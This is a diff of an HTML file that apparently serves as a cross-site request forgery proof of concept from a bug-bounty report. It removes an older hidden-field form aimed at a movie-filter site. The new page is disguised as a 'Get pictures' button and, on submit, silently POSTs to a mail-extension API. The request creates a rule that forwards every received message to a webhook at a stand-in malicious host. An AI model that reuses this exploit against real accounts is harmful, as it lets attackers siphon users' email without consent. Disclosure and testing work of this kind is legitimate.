@@ -1,6 +1,45 @@
-<form action="https://www.moviecontentfilter.com/preferences/RVdT_D" method="POST">
-<input type="hidden" name="category[17]" value="1"/>
-<input type="hidden" name="category[18]" value="1"/>
-<input type="hidden" name="category[19]" value="1"/>
-<input type="submit" value="View my pictures"/>
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>submit demo</title>
+  <style>
+  p {
+    margin: 0;
+    color: blue;
+  }
+  div,p {
+    margin-left: 10px;
+  }
+  span {
+    color: red;
+  }
+  </style>
+  <script src="https://code.jquery.com/jquery-1.10.2.js"></script>
+</head>
+<body>
+ 
+<p>Get pictures.</p>
+<form id='lol'>
+  <div>
+    <input type="submit">
+  </div>
 </form>
+<span></span>
+ 
+<script>
+$( "#lol" ).submit(function( event ) {
+  event.preventDefault();
+  $.ajax({
+  type: "POST",
+  url: "https://app.mixmax.com/api/rules/?user=hackeronejosh@gmail.com",
+  data: JSON.stringify({"foo": "bar", "_id":null,"name": "123","userId":null,"createdAt":null,"modifiedAt":null,"eventName":"message:received","filter":null,"action":{"type":"postToWebhook", "webhookUrl": "https://malicioussite.com", "url": "https://gmail.com"},"isPaused":true, "url": "https://malicioussite.com"}),
+  success: function(){alert(0);},
+  dataType: "json",
+  contentType : "application/json"
+});
+});
+</script>
+ 
+</body>
+</html>
